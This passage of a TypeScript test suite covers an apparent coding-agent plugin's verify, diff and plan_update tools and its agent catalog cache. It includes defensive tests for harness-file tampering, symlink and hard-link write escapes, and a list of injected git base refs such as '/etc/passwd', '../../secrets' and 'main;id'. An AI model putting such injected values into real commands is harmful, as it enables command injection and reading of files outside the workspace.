    assert.equal(result.stdout, "", command)
    assert.equal(result.durationMs, 0, command)
    assert.equal(existsSync(join(root, "pkg", "ran")), false, "the refused script was not spawned")
  }
  assert.equal(host.permissionCalls.length, 7)
  assert.equal(host.diffCalls.length, 7)
})

test("verify expands a wildcard npm workspace pattern for --workspaces", async () => {
  const { root } = probeFixture()
  mkdirSync(join(root, "packages"), { recursive: true })
  for (const name of ["one", "two"]) {
    mkdirSync(join(root, "packages", name), { recursive: true })
    writeFileSync(
      join(root, "packages", name, "package.json"),
      JSON.stringify({ scripts: { test: "make check" } }),
      "utf8",
    )
    writeFileSync(join(root, "packages", name, "Makefile"), "check:\n\t@touch ran\n", "utf8")
  }
  writeFileSync(
    join(root, "package.json"),
    JSON.stringify({ private: true, workspaces: ["packages/*"], scripts: { test: "true" } }),
    "utf8",
  )
  const host = fakeHost(root)
  host.setDiffFiles([diffFile("packages/one/Makefile"), diffFile("packages/two/Makefile")])
  await setup(host.context)

  const result = JSON.parse(await runTool(host, "verify", { command: "npm test --workspaces" }))

  assert.equal(result.ok, false)
  assert.equal(result.exitCode, -1)
  assert.equal(result.reason, "harness-modified")
  assert.deepEqual([...result.harnessChanges].sort(), [
    "packages/one/Makefile",
    "packages/two/Makefile",
  ])
  assert.equal(result.stdout, "")
  assert.equal(result.durationMs, 0)
  for (const name of ["one", "two"]) {
    assert.equal(
      existsSync(join(root, "packages", name, "ran")),
      false,
      "the refused script was not spawned",
    )
  }
})

test("verify follows npm script bodies split by semicolons, pipes and or-chains", async () => {
  const cases: readonly { readonly label: string; readonly body: string }[] = [
    { label: "a semicolon", body: "true; make check" },
    { label: "a pipe", body: "true | make check" },
    { label: "an && chain", body: "true && make check" },
    { label: "an || chain", body: "false || make check" },
  ]

  for (const { label, body } of cases) {
    const { root } = probeFixture()
    writeFileSync(join(root, "package.json"), JSON.stringify({ scripts: { test: body } }), "utf8")
    writeFileSync(join(root, "Makefile"), "check:\n\t@touch ran\n", "utf8")
    const host = fakeHost(root)
    host.setDiffFiles([diffFile("Makefile")])
    await setup(host.context)

    const result = JSON.parse(await runTool(host, "verify", { command: "npm test" }))

    assert.equal(result.ok, false, label)
    assert.equal(result.exitCode, -1, label)
    assert.equal(result.reason, "harness-modified", label)
    assert.deepEqual(result.harnessChanges, ["Makefile"], label)
    assert.equal(result.stdout, "", label)
    assert.equal(result.durationMs, 0, label)
    assert.equal(existsSync(join(root, "ran")), false, label)
  }
})

test("a failed working-diff read skips the harness check instead of blocking the run", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  host.failDiff("not a git repository")
  await setup(host.context)

  const result = JSON.parse(await runTool(host, "verify", { command: "echo wippa-harness" }))

  assert.equal(result.ok, true)
  assert.equal(result.exitCode, 0)
  assert.equal(result.harnessCheck, "skipped")
  assert.equal(result.harnessChanges, undefined)
})

test("the permission assertion runs before the harness refusal", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  host.setDiffFiles([diffFile("harness-marker.cjs", "added")])
  host.denyPermission("denied by rule")
  await setup(host.context)

  await assert.rejects(
    () => runTool(host, "verify", { command: "node harness-marker.cjs" }),
    /denied by rule/,
  )
  assert.equal(host.permissionCalls.length, 1)
  assert.equal(host.diffCalls.length, 0, "the harness check never ran after the denial")
  assert.equal(existsSync(join(root, "ran.txt")), false)
})

test("an unrelated agent in the global directory is not in the catalog", async () => {
  const previous = process.env.OPENCODE_CONFIG_DIR
  const configDir = mkdtempSync(join(tmpdir(), "wippa-plugin-global-"))
  const globalAgents = join(configDir, "agents")
  mkdirSync(globalAgents, { recursive: true })
  writeFileSync(
    join(globalAgents, "foreign-auditor.md"),
    probeAgent("An unrelated global agent installed for another project."),
  )

  process.env.OPENCODE_CONFIG_DIR = configDir
  try {
    const { root } = probeFixture()
    const host = fakeHost(root)
    await setup(host.context)

    const found = await runTool(host, "subagent_search", { query: "foreign-auditor" })
    assert.match(found, /No agent matches "foreign-auditor"/)
    assert.ok(!(await runTool(host, "subagent_list", {})).includes("foreign-auditor"))
    assert.match(await runTool(host, "subagent_list", {}), /## Probe Group \(3\)/)
  } finally {
    if (previous === undefined) delete process.env.OPENCODE_CONFIG_DIR
    else process.env.OPENCODE_CONFIG_DIR = previous
  }
})

test("a custom global agent is in the catalog when it is listed in WIPPA_CUSTOM_AGENT_IDS", async () => {
  const previousConfig = process.env.OPENCODE_CONFIG_DIR
  const previousIds = process.env.WIPPA_CUSTOM_AGENT_IDS
  const configDir = mkdtempSync(join(tmpdir(), "wippa-plugin-global-"))
  const globalAgents = join(configDir, "agents")
  mkdirSync(globalAgents, { recursive: true })
  writeFileSync(
    join(globalAgents, "custom-probe.md"),
    probeAgent("A user-owned global agent."),
  )

  process.env.OPENCODE_CONFIG_DIR = configDir
  process.env.WIPPA_CUSTOM_AGENT_IDS = "custom-probe"
  try {
    const { root } = probeFixture()
    const host = fakeHost(root)
    await setup(host.context)

    const found = await runTool(host, "subagent_search", { query: "custom-probe" })
    assert.match(found, /custom-probe/)
    assert.match(found, /A user-owned global agent\./)
  } finally {
    if (previousConfig === undefined) delete process.env.OPENCODE_CONFIG_DIR
    else process.env.OPENCODE_CONFIG_DIR = previousConfig
    if (previousIds === undefined) delete process.env.WIPPA_CUSTOM_AGENT_IDS
    else process.env.WIPPA_CUSTOM_AGENT_IDS = previousIds
  }
})

test("diff reads the working diff as structured files", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  const files = [
    { file: "src/a.ts", patch: "@@ -1 +1 @@\n-old\n+new\n", additions: 1, deletions: 1, status: "modified" as const },
    { file: "src/b.ts", patch: "", additions: 4, deletions: 0, status: "added" as const },
  ]
  host.setDiffFiles(files)
  await setup(host.context)

  const controller = new AbortController()
  const content = await runTool(host, "diff", {}, controller.signal)

  assert.deepEqual(
    JSON.parse(content),
    files,
    "the location envelope of the VCS reply is unwrapped to the file list",
  )
  assert.equal(host.diffCalls.length, 1)
  assert.deepEqual(host.diffCalls[0], {
    mode: "working",
    context: 3,
    signal: controller.signal,
  })
})

test("diff passes the requested mode and base and clamps the context window", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  await runTool(host, "diff", {
    mode: "branch",
    base: "origin/main",
    context: 1_000,
  })

  const call = host.diffCalls[0]!
  assert.equal(call.mode, "branch")
  assert.equal(call.base, "origin/main")
  assert.equal(call.context, 100)
})

test("diff refuses an unknown mode without asking the VCS", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const content = await runTool(host, "diff", { mode: "staged" })

  assert.deepEqual(JSON.parse(content), {
    error: "mode must be one of working, branch or committed",
  })
  assert.equal(host.diffCalls.length, 0)
})

test("diff refuses an invalid base ref without asking the VCS", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  for (const base of ["/etc/passwd", "../../secrets", "main..HEAD", "-p", "main;id", "a b"]) {
    const content = await runTool(host, "diff", { mode: "branch", base })
    const parsed = JSON.parse(content)
    assert.ok(parsed.error?.startsWith("invalid base:"), `${base} → ${content}`)
    assert.equal(host.diffCalls.length, 0, `${base} must not reach the VCS service`)
  }

  // A sane ref passes through unchanged.
  await runTool(host, "diff", { mode: "branch", base: "origin/main" })
  assert.equal(host.diffCalls.length, 1)
  assert.equal(host.diffCalls[0]?.base, "origin/main")
})

test("diff reports a VCS failure as structured output instead of throwing", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  host.failDiff("not a git repository")
  await setup(host.context)

  const content = await runTool(host, "diff", { base: 42 })

  assert.deepEqual(JSON.parse(content), { error: "not a git repository" })
  assert.equal(host.diffCalls[0]?.base, undefined, "a non-string base is absent")
})

test("plan_update writes .opencode/PLAN.md and returns bytes", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const content = "# Test Plan\n\n- [ ] Task 1\n"
  const resultJson = await runTool(host, "plan_update", { content })
  const result = JSON.parse(resultJson)

  assert.equal(result.ok, true)
  assert.equal(result.path, ".opencode/PLAN.md")
  assert.equal(result.bytes, Buffer.byteLength(content, "utf8"))

  const written = readFileSync(join(root, ".opencode", "PLAN.md"), "utf8")
  assert.equal(written, content)

  // The write asserts its own permission, naming the fixed path.
  assert.equal(host.permissionCalls.length, 1)
  assert.equal(host.permissionCalls[0]?.action, "plan_update")
  assert.deepEqual(host.permissionCalls[0]?.resources, [".opencode/PLAN.md"])
  assert.deepEqual(host.permissionCalls[0]?.save, [".opencode/PLAN.md"])

  const badResultJson = await runTool(host, "plan_update", { content: 123 })
  const badResult = JSON.parse(badResultJson)
  assert.equal(badResult.error, "content must be a string")
  assert.equal(host.permissionCalls.length, 1, "invalid content is refused before the permission call")
})

test("a denied plan_update assertion prevents the write and leaves the ledger unchanged", async () => {
  const { root } = probeFixture()
  mkdirSync(join(root, ".opencode"), { recursive: true })
  const plan = join(root, ".opencode", "PLAN.md")
  writeFileSync(plan, "original plan\n", "utf8")

  const host = fakeHost(root)
  host.denyPermission("denied by rule")
  await setup(host.context)

  await assert.rejects(
    () => runTool(host, "plan_update", { content: "# Replacement\n" }),
    /denied by rule/,
  )
  assert.equal(readFileSync(plan, "utf8"), "original plan\n")
  assert.equal(host.permissionCalls.length, 1)
  assert.equal(host.permissionCalls[0]?.action, "plan_update")
  assert.deepEqual(host.permissionCalls[0]?.resources, [".opencode/PLAN.md"])
})

test("updatePlan refuses to write through a symbolic link", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const opencodeDir = join(root, ".opencode")
  mkdirSync(opencodeDir, { recursive: true })
  const target = join(root, "target.txt")
  writeFileSync(target, "original content", "utf8")
  const symlinkPath = join(opencodeDir, "PLAN.md")
  symlinkSync(target, symlinkPath)

  const resultJson = await runTool(host, "plan_update", { content: "# Malicious plan\n" })
  const result = JSON.parse(resultJson)
  assert.deepEqual(result, {
    error: "refusing to write to a symbolic link at .opencode/PLAN.md",
  })
  assert.equal(readFileSync(target, "utf8"), "original content")

  const directResult = updatePlan(root, "# Direct overwrite\n")
  assert.deepEqual(directResult, {
    error: "refusing to write to a symbolic link at .opencode/PLAN.md",
  })
  assert.equal(readFileSync(target, "utf8"), "original content")
})

test("updatePlan refuses to write through a dangling symbolic link", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const opencodeDir = join(root, ".opencode")
  mkdirSync(opencodeDir, { recursive: true })
  const target = join(root, "nonexistent-target.txt")
  const symlinkPath = join(opencodeDir, "PLAN.md")
  symlinkSync(target, symlinkPath)

  const resultJson = await runTool(host, "plan_update", { content: "# Malicious plan\n" })
  const result = JSON.parse(resultJson)
  assert.deepEqual(result, {
    error: "refusing to write to a symbolic link at .opencode/PLAN.md",
  })
  assert.equal(existsSync(target), false)

  const directResult = updatePlan(root, "# Direct overwrite\n")
  assert.deepEqual(directResult, {
    error: "refusing to write to a symbolic link at .opencode/PLAN.md",
  })
  assert.equal(existsSync(target), false)
})

test("updatePlan refuses to write through a hard link", async () => {
  const { root } = probeFixture()
  const outside = mkdtempSync(join(tmpdir(), "wippa-plan-outside-"))
  const target = join(outside, "outside.txt")
  writeFileSync(target, "outside content\n", "utf8")
  mkdirSync(join(root, ".opencode"), { recursive: true })
  // A hard link is the same inode under another name: writing the workspace
  // path would overwrite the outside file, and there is no symlink to refuse.
  linkSync(target, join(root, ".opencode", "PLAN.md"))

  const host = fakeHost(root)
  await setup(host.context)

  const resultJson = await runTool(host, "plan_update", { content: "# Malicious plan\n" })
  assert.deepEqual(JSON.parse(resultJson), {
    error: "refusing to write to a hard link at .opencode/PLAN.md",
  })
  assert.equal(readFileSync(target, "utf8"), "outside content\n")

  const directResult = updatePlan(root, "# Direct overwrite\n")
  assert.deepEqual(directResult, {
    error: "refusing to write to a hard link at .opencode/PLAN.md",
  })
  assert.equal(readFileSync(target, "utf8"), "outside content\n")
})

test("updatePlan refuses a .opencode directory that is a symbolic link", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const outside = mkdtempSync(join(tmpdir(), "wippa-plan-outside-"))
  symlinkSync(outside, join(root, ".opencode"))

  const resultJson = await runTool(host, "plan_update", { content: "# Malicious plan\n" })
  assert.deepEqual(JSON.parse(resultJson), {
    error: "refusing to write through a symbolic link at .opencode",
  })
  assert.equal(existsSync(join(outside, "PLAN.md")), false, "the outside directory stayed untouched")

  const directResult = updatePlan(root, "# Direct overwrite\n")
  assert.deepEqual(directResult, {
    error: "refusing to write through a symbolic link at .opencode",
  })
  assert.equal(existsSync(join(outside, "PLAN.md")), false)
})

test("editing the roster invalidates the cached catalog", async () => {
  const { root, roster } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const first = await runTool(host, "subagent_list", {})
  assert.match(first, /## Probe Group \(3\)/)

  writeFileSync(roster, probeRoster("Renamed Group"))

  const second = await runTool(host, "subagent_list", {})
  assert.match(second, /## Renamed Group \(3\)/)
  assert.ok(!second.includes("## Probe Group"), "the cached category fields are not reused")
})

test("a roster beside the agents directory still invalidates the cache", async () => {
  // The roster is not itself an agent file here, so only the roster
  // fingerprint can see the edit and force a rebuild.
  const { root, roster } = probeFixture(true)
  const host = fakeHost(root)
  await setup(host.context)

  const first = await runTool(host, "subagent_list", {})
  assert.match(first, /## Probe Group \(3\)/)

  writeFileSync(roster, probeRoster("Beside Renamed"))

  const second = await runTool(host, "subagent_list", {})
  assert.match(second, /## Beside Renamed \(3\)/)
  assert.ok(!second.includes("## Probe Group"), "the cached category fields are not reused")
})

test("a new agent file invalidates the cached catalog", async () => {
  const { root, agents } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const first = await runTool(host, "subagent_list", {})
  assert.ok(!first.includes("`probe-delta`"))

  writeFileSync(join(agents, "probe-delta.md"), probeAgent("Delta probe agent."))

  const second = await runTool(host, "subagent_list", {})
  assert.ok(
    second.includes("`probe-delta`"),
    "the new file is indexed without an explicit cache clear",
  )
})

test("a removed agent file invalidates the cached catalog", async () => {
  const { root, agents } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const first = await runTool(host, "subagent_list", {})
  assert.ok(first.includes("`probe-gamma`"))

  rmSync(join(agents, "probe-gamma.md"))

  const second = await runTool(host, "subagent_list", {})
  assert.ok(!second.includes("`probe-gamma`"), "the removed file leaves the catalog")
})

test("a nested category edit invalidates the cached catalog", async () => {
  const { root, agents } = probeFixture()
  const nested = join(agents, "01-extra")
  mkdirSync(nested, { recursive: true })
  const path = join(nested, "nested-probe.md")
  writeFileSync(path, probeAgent("Nested probe agent."))
  const host = fakeHost(root)
  await setup(host.context)

  const first = await runTool(host, "subagent_search", { query: "nested-probe" })
  assert.match(first, /Nested probe agent\./)
  assert.match(first, /01-extra|extra/, "the nested category is indexed")

  writeFileSync(path, probeAgent("Nested probe agent, renamed."))

  const second = await runTool(host, "subagent_search", { query: "nested-probe" })
  assert.match(second, /Nested probe agent, renamed\./)
})
